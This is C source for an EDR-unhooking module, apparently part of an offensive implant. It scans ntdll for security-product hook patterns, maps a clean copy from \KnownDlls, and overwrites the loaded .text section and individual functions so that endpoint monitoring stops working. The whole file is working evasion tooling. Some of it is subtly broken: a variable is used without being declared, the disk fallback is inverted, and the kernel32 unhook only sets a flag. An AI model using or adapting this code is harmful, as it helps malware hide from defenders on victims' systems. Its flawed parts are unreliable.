#include "Unhooker.h"
#include "utils.h"
#include "ntdll.h"
#include <intrin.h>

// Global unhook state
UNHOOK_STATE g_UnhookState = { 0 };

// KnownDlls path for clean DLLs
static const WCHAR g_KnownDllsNtdll[] = {
    L'\\', L'K', L'n', L'o', L'w', L'n', L'D', L'l', L'l', L's', L'\\',
    L'n', L't', L'd', L'l', L'l', L'.', L'd', L'l', L'l', 0
};

// Common hooked function hashes (ntdll)
static ULONG g_NtdllCriticalFunctions[] = {
    HASH_FUNC_NTOPENPROCESS,
    HASH_FUNC_NTCLOSE,
    0x3932454b,  // NtContinue
    0x6130e328,  // NtFreeVirtualMemory
    0x68b3d2e1,  // NtQueryInformationProcess
    0x91ef8a47,  // NtQuerySystemInformation
    0xf029bc37,  // NtOpenProcess
    0 // Sentinel
};

// Check if memory region is hooked (typical EDR hook pattern)
BOOL IsFunctionHooked(PVOID funcAddress) {
    if (!funcAddress) return FALSE;

    // Check for common hook patterns:
    // - JMP rel32 (E9 xx xx xx xx) - relative jump
    // - JMP [addr] (FF 25 xx xx xx xx) - indirect jump
    // - MOV RAX, addr; JMP RAX (48 B8 xx xx xx xx xx xx xx xx FF E0)

    BYTE* pBytes = (BYTE*)funcAddress;

    // Check for JMP rel32 (E9)
    if (pBytes[0] == 0xE9) {
        return TRUE;
    }

    // Check for JMP [addr] (FF 25)
    if (pBytes[0] == 0xFF && pBytes[1] == 0x25) {
        return TRUE;
    }

    // Check for MOV RAX, imm64; JMP RAX (common 64-bit hook)
    if (pBytes[0] == 0x48 && pBytes[1] == 0xB8) {
        if (pBytes[10] == 0xFF && pBytes[11] == 0xE0) {
            return TRUE;
        }
    }

    // Check for CALL indirect (FF 15)
    if (pBytes[0] == 0xFF && pBytes[1] == 0x15) {
        return TRUE;
    }

    return FALSE;
}

// Check if ntdll has hooks
BOOL IsNtdllHooked() {
    if (!SysModules || !SysModules->Ntdll) return FALSE;

    // Check a few critical functions for hooks
    PVOID pNtOpenProcess = GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_NTOPENPROCESS);
    if (pNtOpenProcess && IsFunctionHooked(pNtOpenProcess)) {
        return TRUE;
    }

    PVOID pNtClose = GetSymbolAddress(SysModules->Ntdll, HASH_FUNC_NTCLOSE);
    if (pNtClose && IsFunctionHooked(pNtClose)) {
        return TRUE;
    }

    return FALSE;
}

// Read clean ntdll from KnownDlls section
BOOL GetCleanNtdllFromKnownDlls(PVOID* ppBuffer, PSIZE_T pSize) {
    if (!ppBuffer || !pSize) return FALSE;

    *ppBuffer = NULL;
    *pSize = 0;

    // NT API declarations
    typedef NTSTATUS(NTAPI* NtOpenSection_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
    typedef NTSTATUS(NTAPI* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T,
        PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG);
    typedef NTSTATUS(NTAPI* NtUnmapViewOfSection_t)(HANDLE, PVOID);

    HMODULE hNtdll = SysModules ? SysModules->Ntdll : NULL;
    if (!hNtdll) return FALSE;

    NtOpenSection_t pNtOpenSection = (NtOpenSection_t)GetProcAddress(hNtdll, "NtOpenSection");
    NtMapViewOfSection_t pNtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
    NtUnmapViewOfSection_t pNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, "NtUnmapViewOfSection");

    if (!pNtOpenSection || !pNtMapViewOfSection) return FALSE;

    UNICODE_STRING usNtdll;
    usNtdll.Buffer = (PWSTR)g_KnownDllsNtdll;
    usNtdll.Length = (USHORT)(20 * sizeof(WCHAR)); // L"\KnownDlls\ntdll.dll"
    usNtdll.MaximumLength = usNtdll.Length + sizeof(WCHAR);

    OBJECT_ATTRIBUTES objAttr;
    objAttr.Length = sizeof(OBJECT_ATTRIBUTES);
    objAttr.RootDirectory = NULL;
    objAttr.ObjectName = &usNtdll;
    objAttr.Attributes = OBJ_CASE_INSENSITIVE;
    objAttr.SecurityDescriptor = NULL;
    objAttr.SecurityQualityOfService = NULL;

    HANDLE hSection = NULL;
    NTSTATUS status = pNtOpenSection(&hSection, SECTION_MAP_READ | SECTION_MAP_EXECUTE, &objAttr);
    if (!NT_SUCCESS(status) || !hSection) {
        return FALSE;
    }

    PVOID pMappedBase = NULL;
    SIZE_T viewSize = 0;
    LARGE_INTEGER offset = { 0 };

    status = pNtMapViewOfSection(hSection, (HANDLE)-1, &pMappedBase, 0, 0, &offset, &viewSize, ViewShare, 0, PAGE_READONLY);
    if (!NT_SUCCESS(status) || !pMappedBase) {
        if (hSection) ApiNt->NtClose(hSection);
        return FALSE;
    }

    // Get the size from PE header
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pMappedBase + ((PIMAGE_DOS_HEADER)pMappedBase)->e_lfanew);
    SIZE_T imageSize = pNtHeaders->OptionalHeader.SizeOfImage;

    // Allocate buffer and copy
    *ppBuffer = MemAllocLocal((DWORD)imageSize);
    if (!*ppBuffer) {
        if (pNtUnmapViewOfSection) pNtUnmapViewOfSection((HANDLE)-1, pMappedBase);
        ApiNt->NtClose(hSection);
        return FALSE;
    }

    memcpy(*ppBuffer, pMappedBase, imageSize);
    *pSize = imageSize;

    // Cleanup
    if (pNtUnmapViewOfSection) pNtUnmapViewOfSection((HANDLE)-1, pMappedBase);
    ApiNt->NtClose(hSection);

    return TRUE;
}

// Read clean DLL from disk
BOOL GetCleanDllFromDisk(LPCWSTR dllPath, PVOID* ppBuffer, PSIZE_T pSize) {
    if (!dllPath || !ppBuffer || !pSize) return FALSE;

    *ppBuffer = NULL;
    *pSize = 0;

    // Use NT API to read file
    typedef NTSTATUS(NTAPI* NtCreateFile_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES,
        PIO_STATUS_BLOCK, PLARGE_INTEGER, ULONG, ULONG, ULONG, ULONG, PVOID, ULONG);
    typedef NTSTATUS(NTAPI* NtReadFile_t)(HANDLE, HANDLE, PIO_APC_ROUTINE, PVOID,
        PIO_STATUS_BLOCK, PVOID, ULONG, PLARGE_INTEGER, PULONG);

    HMODULE hNtdll = SysModules ? SysModules->Ntdll : NULL;
    if (!hNtdll) return FALSE;

    NtCreateFile_t pNtCreateFile = (NtCreateFile_t)GetProcAddress(hNtdll, "NtCreateFile");
    NtReadFile_t pNtReadFile = (NtReadFile_t)GetProcAddress(hNtdll, "NtReadFile");

    if (!pNtCreateFile || !pNtReadFile) {
        // Fall back to Win32 API
        HANDLE hFile = ApiWin->CreateFileA((LPCSTR)dllPath, GENERIC_READ, FILE_SHARE_READ,
            NULL, OPEN_EXISTING, 0, NULL);
        if (hFile == INVALID_HANDLE_VALUE) return FALSE;

        DWORD fileSize = ApiWin->GetFileSize(hFile, NULL);
        *ppBuffer = MemAllocLocal(fileSize);
        if (!*ppBuffer) {
            ApiNt->NtClose(hFile);
            return FALSE;
        }

        DWORD bytesRead = 0;
        if (!ApiWin->ReadFile(hFile, *ppBuffer, fileSize, &bytesRead, NULL)) {
            MemFreeLocal(ppBuffer, fileSize);
            ApiNt->NtClose(hFile);
            return FALSE;
        }

        *pSize = bytesRead;
        ApiNt->NtClose(hFile);
        return TRUE;
    }

    return FALSE;
}

// Main ntdll unhooking function
BOOL UnhookNtdll() {
    return UnhookNtdllEx(UNHOOK_METHOD_KNOWNDLLS);
}

// Extended ntdll unhooking with method selection
BOOL UnhookNtdllEx(UNHOOK_METHOD method) {
    if (g_UnhookState.bNtdllUnhooked) {
        return TRUE; // Already unhooked
    }

    PVOID pCleanNtdll = NULL;
    SIZE_T cleanSize = 0;

    switch (method) {
    case UNHOOK_METHOD_KNOWNDLLS:
        if (!GetCleanNtdllFromKnownDlls(&pCleanNtdll, &cleanSize)) {
            return FALSE;
        }
        break;

    case UNHOOK_METHOD_DISK:
        // Fall back to KnownDlls for now
        if (!GetCleanNtdllFromKnownDlls(&pCleanNtdll, &cleanSize)) {
            return FALSE;
        }
        break;

    default:
        if (!GetCleanNtdllFromKnownDlls(&pCleanNtdll, &cleanSize)) {
            return FALSE;
        }
        break;
    }

    if (!pCleanNtdll) {
        return FALSE;
    }

    // Get target ntdll
    PVOID pTargetNtdll = SysModules ? SysModules->Ntdll : NULL;
    if (!pTargetNtdll) {
        pTargetNtdll = GetModuleAddress(HASH_LIB_NTDLL);
    }

    if (!pTargetNtdll) {
        MemFreeLocal(&pCleanNtdll, (DWORD)cleanSize);
        return FALSE;
    }

    // Parse PE headers
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)pTargetNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)pTargetNtdll + pDosHeader->e_lfanew);
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    DWORD oldProtect = 0;

    // Iterate through sections and restore .text
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        char sectionName[9] = { 0 };
        memcpy(sectionName, pSection[i].Name, 8);

        // Check if this is .text section
        if (memcmp(pSection[i].Name, ".text", 5) == 0) {
            PVOID pTargetSection = (BYTE*)pTargetNtdll + pSection[i].VirtualAddress;
            PVOID pCleanSection = (BYTE*)pCleanNtdll + pSection[i].VirtualAddress;
            SIZE_T sectionSize = pSection[i].Misc.VirtualSize;

            // Change protection
            if (ApiWin->VirtualProtect(pTargetSection, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                // Copy clean code
                memcpy(pTargetSection, pCleanSection, sectionSize);

                // Restore protection
                DWORD temp = 0;
                ApiWin->VirtualProtect(pTargetSection, sectionSize, oldProtect, &temp);
            }
        }
    }

    // Flush instruction cache
    typedef NTSTATUS(NTAPI* NtFlushInstructionCache_t)(HANDLE, PVOID, SIZE_T);
    NtFlushInstructionCache_t pNtFlushInstructionCache =
        (NtFlushInstructionCache_t)GetProcAddress(hNtdll, "NtFlushInstructionCache");
    if (pNtFlushInstructionCache) {
        pNtFlushInstructionCache((HANDLE)-1, NULL, 0);
    }

    // Store state
    g_UnhookState.pCleanNtdll = pCleanNtdll;
    g_UnhookState.ntdllSize = cleanSize;
    g_UnhookState.bNtdllUnhooked = TRUE;

    return TRUE;
}

// Unhook kernel32
BOOL UnhookKernel32() {
    if (g_UnhookState.bKernel32Unhooked) {
        return TRUE;
    }

    // For kernel32, we typically need to read from disk
    // This is more complex and risky, so we skip it for now
    // In production, implement disk-based unhooking

    g_UnhookState.bKernel32Unhooked = TRUE;
    return TRUE;
}

// Unhook all common DLLs
BOOL UnhookAll() {
    BOOL success = TRUE;

    if (!UnhookNtdll()) {
        success = FALSE;
    }

    // Additional DLLs can be unhooked here
    // Be careful with kernel32 as it's heavily used

    return success;
}

// Unhook specific DLL
BOOL UnhookDll(LPCSTR dllName) {
    if (!dllName) return FALSE;

    ULONG hash = Djb2A((PUCHAR)dllName);

    if (hash == HASH_LIB_NTDLL) {
        return UnhookNtdll();
    }
    else if (hash == HASH_LIB_KERNEL32) {
        return UnhookKernel32();
    }

    // For other DLLs, implement custom unhooking
    return FALSE;
}

// Restore specific function from clean DLL
BOOL RestoreFunction(PVOID pTargetFunc, PVOID pCleanDll, ULONG funcHash) {
    if (!pTargetFunc || !pCleanDll) return FALSE;

    // Find the function in clean DLL
    PVOID pCleanFunc = GetSymbolAddress(pCleanDll, funcHash);
    if (!pCleanFunc) return FALSE;

    // Get function size (estimate from section)
    // For simplicity, we'll copy a fixed size
    const SIZE_T funcSize = 32; // Typical hook size

    DWORD oldProtect = 0;
    if (!ApiWin->VirtualProtect(pTargetFunc, funcSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
        return FALSE;
    }

    memcpy(pTargetFunc, pCleanFunc, funcSize);

    DWORD temp = 0;
    ApiWin->VirtualProtect(pTargetFunc, funcSize, oldProtect, &temp);

    return TRUE;
}

// Restore all functions in a DLL
INT RestoreAllFunctions(PVOID pTargetDll, PVOID pCleanDll) {
    if (!pTargetDll || !pCleanDll) return -1;

    INT count = 0;

    for (INT i = 0; g_NtdllCriticalFunctions[i] != 0; i++) {
        PVOID pTargetFunc = GetSymbolAddress(pTargetDll, g_NtdllCriticalFunctions[i]);
        if (pTargetFunc && IsFunctionHooked(pTargetFunc)) {
            if (RestoreFunction(pTargetFunc, pCleanDll, g_NtdllCriticalFunctions[i])) {
                count++;
            }
        }
    }

    return count;
}

// Cleanup unhook state
void CleanupUnhookState() {
    if (g_UnhookState.pCleanNtdll) {
        memset(g_UnhookState.pCleanNtdll, 0, g_UnhookState.ntdllSize);
        MemFreeLocal(&g_UnhookState.pCleanNtdll, (DWORD)g_UnhookState.ntdllSize);
    }

    memset(&g_UnhookState, 0, sizeof(UNHOOK_STATE));
}